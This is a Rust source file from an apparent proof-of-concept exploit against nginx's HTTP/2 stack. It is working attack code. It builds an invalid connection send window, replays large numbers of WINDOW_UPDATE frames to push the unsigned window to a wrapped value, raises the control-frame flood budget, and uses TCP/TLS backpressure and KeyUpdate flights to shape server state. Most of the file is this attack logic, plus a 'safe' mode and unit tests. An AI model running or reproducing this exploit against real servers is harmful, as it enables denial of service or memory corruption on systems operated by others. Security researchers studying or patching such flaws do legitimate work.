//! Stage 1: create the invalid send window; stage 2: reach the wrapped distance.

use std::time::Duration;

use anyhow::{bail, Result};

use crate::bulk::{self, Ledger};
use crate::h2::{
    frame, head_request_block, headers, range_field, range_request, request_block,
    reset_stream, settings_window, window_update, Session, DATA, END_STREAM,
    FLOW_CONTROL_ERROR, MAX_WINDOW, PREFACE, RST_STREAM,
};
use crate::target::Config;
use crate::tls::{RawTls, StandardTls, Transport};

const SETTLE: Duration = Duration::from_millis(300);

pub struct Bootstrap {
    pub send_window: u64,
    pub next_stream: u32,
    pub release_stream: u32,
    pub target_streams: [u32; 2],
}

/// The flow-control event that refunds queued DATA after the connection window
/// has been raised to MAX. `size` is the runtime body size.
fn cleanup_event(config: &Config, targets: [u32; 2], release: u32) -> Vec<u8> {
    let size = config.http.primary_size as u32;
    let mut event = window_update(0, 2 * size);
    event.extend_from_slice(&window_update(0, MAX_WINDOW));
    for target in targets {
        event.extend_from_slice(&window_update(target, MAX_WINDOW - 1));
    }
    event.extend_from_slice(&settings_window(2));
    event.extend_from_slice(&window_update(0, MAX_WINDOW));
    event.extend_from_slice(&settings_window(65535));
    event.extend_from_slice(&range_request(
        release,
        &config.origin.authority,
        &config.http.primary_path,
        config.profile.http.release_range_start,
        Some(config.profile.http.release_range_end),
        b"",
    ));
    event
}

/// A HEADERS block whose payload repeats the "table size update" filler. The
/// exploit path uses one physical frame; `--safe` splits at the server's max
/// frame size so any nginx accepts it.
fn carrier_block(
    config: &Config,
    stream: u32,
    total_payload: usize,
    split_at: Option<usize>,
) -> Result<Vec<u8>> {
    let head = head_request_block(&config.origin.authority, &config.http.primary_path);
    if total_payload < head.len() {
        bail!("carrier payload is smaller than the request head");
    }
    let mut filler = vec![0x20u8; total_payload - head.len()];
    filler.extend_from_slice(&head);
    Ok(match split_at {
        None => headers(stream, &filler, true),
        Some(max_frame) if max_frame >= filler.len() => headers(stream, &filler, true),
        Some(max_frame) => {
            // HEADERS with END_STREAM, then CONTINUATIONs; END_HEADERS last.
            let mut out = Vec::new();
            let mut offset = 0;
            let mut first = true;
            while offset < filler.len() {
                let take = max_frame.min(filler.len() - offset);
                let last = offset + take == filler.len();
                if first {
                    let mut flags = crate::h2::END_STREAM;
                    if last {
                        flags |= crate::h2::END_HEADERS;
                    }
                    out.extend_from_slice(&crate::h2::frame(
                        crate::h2::HEADERS,
                        flags,
                        stream,
                        &filler[offset..offset + take],
                    ));
                    first = false;
                } else {
                    let flags = if last { crate::h2::END_HEADERS } else { 0 };
                    out.extend_from_slice(&crate::h2::frame(
                        crate::h2::CONTINUATION,
                        flags,
                        stream,
                        &filler[offset..offset + take],
                    ));
                }
                offset += take;
            }
            out
        }
    })
}

pub fn run_bootstrap(config: &mut Config, session: &mut Session<RawTls>, safe: bool) -> Result<Bootstrap> {
    let transport = config.profile.transport.clone();
    let http = config.http.clone();
    if http.primary_size == 0 {
        bail!("runtime body size was not learned");
    }
    let concurrent = (*session.settings.get(&3).unwrap_or(&u32::MAX)) as u64;
    let required = (http.initial_additional_full_responses as u64 + 1)
        .max(transport.predecessor_pin_count + 4);
    if concurrent < required {
        bail!("server allows {concurrent} concurrent streams, need {required}");
    }
    if safe {
        if !(521..=8192).contains(&http.primary_size) {
            bail!(
                "safe mode needs a response body of 521..8192 bytes; got {} (wave size {})",
                http.primary_size,
                3 + http.initial_additional_full_responses
            );
        }
        if 3 + http.initial_additional_full_responses > 126 {
            bail!(
                "safe mode needs one wave of at most 126 streams; got {}",
                3 + http.initial_additional_full_responses
            );
        }
    }

    // Consume the initial connection window exactly with public bodies.
    let full_streams: Vec<u32> = (0..http.initial_additional_full_responses)
        .map(|index| 5 + 2 * index as u32)
        .collect();
    let range_stream = 5 + 2 * http.initial_additional_full_responses as u32;
    let mut packet = Vec::new();
    for stream in &full_streams {
        packet.extend_from_slice(&headers(
            *stream,
            &request_block(&config.origin.authority, &http.primary_path, b""),
            true,
        ));
    }
    packet.extend_from_slice(&range_request(
        range_stream,
        &config.origin.authority,
        &http.primary_path,
        0,
        Some(http.initial_range_end),
        b"",
    ));
    session.send(&packet);
    let wanted: Vec<u32> = full_streams.iter().copied().chain([range_stream]).collect();
    session.wait_for(
        |session| {
            wanted.iter().all(|stream| {
                session.frames.iter().any(|f| {
                    f.kind == DATA && f.stream == *stream && f.flags & END_STREAM != 0
                })
            })
        },
        "initial-window exhaustion",
        crate::limits::stage(Duration::from_secs(15)),
        Duration::from_millis(250),
    )?;
    for stream in &full_streams {
        let response = session.responses.get(stream).cloned().unwrap_or_default();
        if response.status.as_deref() != Some("200") || response.body.len() != http.primary_size {
            bail!("primary response changed on {stream}");
        }
    }
    let range_response = session.responses.get(&range_stream).cloned().unwrap_or_default();
    let initial_range_size = (http.initial_range_end + 1) as usize;
    if range_response.status.as_deref() != Some("206")
        || range_response.body.len() != initial_range_size
        || range_response.body != config.primary_body[..initial_range_size]
    {
        bail!("unexpected profile range response");
    }

    // Transport backpressure: hold nginx's queued DATA in TLS/TCP.
    session.transport.set_backpressure_window(transport.tcp_backpressure_window_bytes)?;

    let target_streams = [range_stream + 2, range_stream + 4];
    let initial_carrier_stream = range_stream + 6;
    let release_stream = range_stream + 8;
    session.send(&settings_window(0));
    std::thread::sleep(SETTLE);
    let mut targets = headers(
        target_streams[0],
        &request_block(&config.origin.authority, &http.primary_path, b""),
        true,
    );
    targets.extend_from_slice(&headers(
        target_streams[1],
        &request_block(&config.origin.authority, &http.primary_path, b""),
        true,
    ));
    session.send(&targets);
    std::thread::sleep(SETTLE);
    let mut credit = window_update(target_streams[0], http.primary_size as u32);
    credit.extend_from_slice(&window_update(target_streams[1], http.primary_size as u32));
    session.send(&credit);
    std::thread::sleep(SETTLE);

    let reserved = 2 * http.primary_size as u64;
    let event = cleanup_event(config, target_streams, release_stream);

    let payload_size = (transport.bootstrap_application_bytes as usize)
        .checked_sub(event.len() + 9)
        .ok_or_else(|| anyhow::anyhow!("bootstrap payload is smaller than the event"))?;
    let max_frame = (*session.settings.get(&5).unwrap_or(&16_777_215)) as usize;
    let carrier = carrier_block(
        config,
        initial_carrier_stream,
        payload_size,
        if safe { Some(max_frame) } else { None },
    )?;
    if !safe {
        if payload_size < head_request_block(&config.origin.authority, &http.primary_path).len()
            || carrier.len() + event.len() != transport.bootstrap_application_bytes as usize
            || (carrier.len() + event.len()) as u64 % transport.bootstrap_alignment_modulus
                != transport.bootstrap_alignment_remainder
        {
            bail!("bootstrap framing changed");
        }
    }
    let mut application = carrier;
    application.extend_from_slice(&event);

    // One prepared flight: fixed records, then handshake KeyUpdates.
    let mut flight = Vec::with_capacity(application.len() + (transport.bootstrap_key_updates as usize) * 27);
    for chunk in application.chunks(crate::tls::TLS_RECORD_PLAINTEXT) {
        flight.extend_from_slice(&session.transport.writer.record(chunk, 23));
    }
    let key_updates = std::env::var("POC_KEYUPDATES").ok().and_then(|v| v.parse().ok()).unwrap_or(transport.bootstrap_key_updates);
    for _ in 0..key_updates {
        flight.extend_from_slice(&session.transport.writer.key_update());
    }
    session.transport.send_backpressured(
        &flight,
        16 * 1024 * 1024,
        Duration::from_secs(5),
        Duration::from_secs(600),
    )?;

    if session.transport.take_openssl_write() {
        bail!("OpenSSL wrote a record after explicit-key takeover");
    }
    eprintln!("  flight sent; waiting for the cleanup oracle");
    // Kick nginx's output queue deterministically. The ACK is queued after the
    // refund event and proves the final traffic key was accepted; without a
    // queued control frame some kernels leave the tail of the output queue
    // unflushed until the 65 s keepalive timer.
    let key_sync = session.frames.len();
    session.send(&frame(6, 0, 0, b"H2HBKEY0"));
    let release_size = (config.profile.http.release_range_end
        - config.profile.http.release_range_start
        + 1) as usize;
    session.wait_for(
        |session| {
            session
                .responses
                .get(&release_stream)
                .map(|response| response.body.len() == release_size)
                .unwrap_or(false)
                && target_streams.iter().all(|stream| {
                    session
                        .frames
                        .iter()
                        .any(|f| f.kind == RST_STREAM && f.stream == *stream)
                })
                && session.received_ping_ack(key_sync, b"H2HBKEY0")
        },
        "cleanup-overcredit oracle",
        crate::limits::stage(Duration::from_secs(60)),
        Duration::from_millis(250),
    )?;
    let release = session.responses.get(&release_stream).cloned().unwrap_or_default();
    let expected_release = &session.responses[&full_streams[0]].body
        [config.profile.http.release_range_start as usize
            ..=config.profile.http.release_range_end as usize];
    if release.status.as_deref() != Some("206") || release.body != expected_release {
        bail!("cleanup oracle returned the wrong public bytes");
    }
    for stream in target_streams {
        let reset = session
            .frames
            .iter()
            .find(|f| f.kind == RST_STREAM && f.stream == stream)
            .ok_or_else(|| anyhow::anyhow!("target stream {stream} was not reset"))?;
        if reset.error_code != Some(FLOW_CONTROL_ERROR) {
            bail!("target stream {stream} reset with {:?}", reset.error_code);
        }
        let response = session.responses.get(&stream).cloned().unwrap_or_default();
        if response.status.as_deref() != Some("200") || !response.body.is_empty() {
            bail!("bootstrap did not preserve queued target DATA on {stream}");
        }
    }

    // The oracle gate above already required the PING ACK under the final key.
    Ok(Bootstrap {
        send_window: if safe {
            0
        } else {
            2 * MAX_WINDOW as u64 + reserved - release_size as u64
        },
        next_stream: release_stream + 2,
        release_stream,
        target_streams,
    })
}

pub struct CarrierState {
    pub first: Ledger,
    pub bulk: Ledger,
    pub tailored_update: u32,
    pub numeric_updates: u64,
    pub first_shape_stream: u32,
}

/// Raise nginx's control-frame flood budget, then walk the unsigned window to
/// exactly `2^64 - negative_distance`.
pub fn reach_wrapped_window(
    config: &Config,
    session: &mut Session<RawTls>,
    send_window: u64,
    next_stream: u32,
) -> Result<CarrierState> {
    let transport = &config.profile.transport;
    let head = head_request_block(&config.origin.authority, &config.http.primary_path);
    let mut last_progress = 0u64;
    let first = bulk::send_carrier(
        &mut session.transport,
        1,
        1,
        next_stream,
        transport.carrier_frame_payload_bytes as u32,
        transport.carrier_filler_hex.as_deref().unwrap_or("20"),
        &head,
        &mut |_, _| {},
    )?;
    session.drain("first carrier", Duration::from_millis(500));
    let first_response = session.responses.get(&next_stream).cloned().unwrap_or_default();
    if first_response.status.as_deref() != Some("200") || !first_response.body.is_empty() {
        bail!("first carrier failed");
    }
    let next_stream = first.next_sid;

    let carrier = bulk::send_carrier(
        &mut session.transport,
        transport.carrier_frames,
        transport.carrier_frames_per_request,
        next_stream,
        transport.carrier_frame_payload_bytes as u32,
        transport.carrier_filler_hex.as_deref().unwrap_or("20"),
        &head,
        &mut |done, total| {
            if done == total || done.saturating_sub(last_progress) >= 64 {
                last_progress = done;
                eprintln!(
                    "  carrier {:.1}% ({:.2} GiB)",
                    100.0 * done as f64 / total as f64,
                    (done * (transport.carrier_frame_payload_bytes + 9)) as f64 / (1u64 << 30) as f64
                );
            }
        },
    )?;
    let carrier_end = carrier.next_sid;
    let expected_requests = transport.carrier_frames / transport.carrier_frames_per_request;
    session.wait_for(
        |session| {
            (next_stream..carrier_end)
                .filter(|stream| session.responses.contains_key(stream))
                .count() as u64
                == expected_requests
        },
        "carrier responses",
        crate::limits::stage(Duration::from_secs(20)),
        Duration::from_millis(250),
    )?;
    if (next_stream..carrier_end).any(|stream| {
        session
            .responses
            .get(&stream)
            .map(|response| response.status.as_deref() != Some("200") || !response.body.is_empty())
            .unwrap_or(false)
    }) {
        bail!("carrier returned unexpected responses");
    }

    let first_shape_stream = carrier_end + 2 * transport.window_owner_count as u32;
    let (tailored_update, numeric_updates) =
        send_numeric_stage(config, session, send_window, carrier_end)?;
    session.drain("window transition", Duration::from_millis(100));
    Ok(CarrierState {
        first,
        bulk: carrier,
        tailored_update: tailored_update as u32,
        numeric_updates,
        first_shape_stream,
    })
}

fn send_numeric_stage(
    config: &Config,
    session: &mut Session<RawTls>,
    start_window: u64,
    first_stream: u32,
) -> Result<(u64, u64)> {
    let transport = &config.profile.transport;
    let (count, tailored_update) =
        bulk::near_wrap(start_window, transport.negative_distance)?;
    let owner_count = transport.window_owner_count as u64;
    let mut tranches = vec![count / owner_count; owner_count as usize];
    for index in 0..(count % owner_count) as usize {
        tranches[index] += 1;
    }
    eprintln!(
        "  WINDOW_UPDATE replay: {} frames across {} owners (tailored {tailored_update:#x})",
        count,
        tranches.len()
    );

    let owner_block = request_block(
        &config.origin.authority,
        &config.http.primary_path,
        &range_field(
            config.profile.http.one_byte_range_start,
            Some(config.profile.http.one_byte_range_start),
        ),
    );
    let maximum = window_update(0, MAX_WINDOW);
    let mut stream_id = first_stream;
    let mut prefix = settings_window(0);
    prefix.extend_from_slice(&headers(stream_id, &owner_block, true));
    prefix.extend_from_slice(&maximum[..1]);
    session.send(&prefix);

    let progress_interval = (tranches.len() / 10).max(1);
    for (index, tranche) in tranches.iter().enumerate() {
        let owner_stream = stream_id;
        session.wait_for_immediate(
            |session| session.responses.contains_key(&stream_id),
            "WINDOW_UPDATE owner",
            crate::limits::stage(Duration::from_secs(20)),
            Duration::from_millis(250),
        )?;
        let response = session.responses.get(&owner_stream).cloned().unwrap_or_default();
        if response.status.as_deref() != Some("206") {
            bail!("WINDOW_UPDATE owner returned unexpected status");
        }
        if !response.body.is_empty() {
            bail!("WINDOW_UPDATE owner consumed response credit");
        }
        // Every tranche but the last is emitted by the in-process sender; the
        // final boundary frame is completed by the following write.
        let mut last_progress = 0u64;
        bulk::send_window_updates(
            &mut session.transport,
            tranche.saturating_sub(1),
            1,
            &mut |done, total| {
                let percent = 100 * done / total.max(1);
                if done == total || percent >= last_progress + 25 {
                    last_progress = percent;
                    eprintln!("    tranche {}/{}: {percent}%", index + 1, tranches.len());
                }
            },
        )?;
        let mut boundary = maximum[1..].to_vec();
        if index + 1 < tranches.len() {
            let next = stream_id + 2;
            boundary.extend_from_slice(&reset_stream(stream_id));
            boundary.extend_from_slice(&headers(next, &owner_block, true));
            boundary.extend_from_slice(&maximum[..1]);
            stream_id = next;
        } else {
            boundary.extend_from_slice(&reset_stream(stream_id));
            boundary.extend_from_slice(&settings_window(0));
        }
        session.send_event(&boundary);
        if (index + 1) % progress_interval == 0 || index + 1 == tranches.len() {
            eprintln!(
                "  WINDOW_UPDATE tranches: {:.0}% ({}/{})",
                100.0 * (index + 1) as f64 / tranches.len() as f64,
                index + 1,
                tranches.len()
            );
        }
    }
    Ok((tailored_update, count))
}

pub fn open_auxiliaries(config: &Config) -> Result<Vec<Session<StandardTls>>> {
    let mut auxiliaries = Vec::new();
    eprintln!("  opening {} auxiliary connections", config.profile.transport.auxiliary_count);
    for index in 0..config.profile.transport.auxiliary_count {
        let tcp = config.connect(false)?;
        let tls = StandardTls::connect(tcp, &config.origin.host)?;
        let mut session = Session::new(tls);
        session.send(&[PREFACE, &settings_window(0)].concat());
        session.drain(&format!("auxiliary setup {index}"), Duration::from_millis(200));
        if !session.is_open() {
            bail!("auxiliary setup {index} failed: {:?}", session.end);
        }
        auxiliaries.push(session);
    }
    Ok(auxiliaries)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::profile::load_builtins;

    fn config_with_size(size: usize) -> Config {
        let profile = load_builtins()
            .unwrap()
            .into_iter()
            .find(|p| p.name.contains("1.31.8"))
            .unwrap();
        let origin = crate::target::parse_origin("https://example.com/").unwrap();
        let mut config = Config::new(origin, b"id".to_vec(), vec![profile.clone()], profile).unwrap();
        config.set_http_runtime(&vec![0u8; size], false).unwrap();
        config
    }

    #[test]
    fn cleanup_event_matches_the_reference_shape() {
        let config = config_with_size(896);
        let event = cleanup_event(&config, [149, 151], 155);
        assert_eq!(&event[..13], &window_update(0, 1792)[..]);
        assert_eq!(&event[13..26], &window_update(0, MAX_WINDOW)[..]);
        let release = range_request(155, b"example.com", b"/index.html", 0, Some(9), b"");
        assert_eq!(&event[event.len() - release.len()..], &release[..]);
    }

    #[test]
    fn carrier_split_reassembles_the_block() {
        let config = config_with_size(896);
        let head = head_request_block(&config.origin.authority, &config.http.primary_path);
        let total = 200_000usize;
        let whole = carrier_block(&config, 7, total, None).unwrap();
        let split = carrier_block(&config, 7, total, Some(16_384)).unwrap();
        // Reassemble the split payload and compare with the single frame.
        let mut payload = Vec::new();
        let mut cursor = 0;
        while cursor + 9 <= split.len() {
            let length = ((split[cursor] as usize) << 16)
                | ((split[cursor + 1] as usize) << 8)
                | split[cursor + 2] as usize;
            let kind = split[cursor + 3];
            assert!(kind == crate::h2::HEADERS || kind == crate::h2::CONTINUATION);
            payload.extend_from_slice(&split[cursor + 9..cursor + 9 + length]);
            cursor += 9 + length;
        }
        assert_eq!(whole.len(), 9 + total);
        assert_eq!(payload.len(), total);
        assert_eq!(&payload[..total - head.len()], &vec![0x20u8; total - head.len()][..]);
        assert_eq!(&payload[total - head.len()..], &head[..]);
    }
}
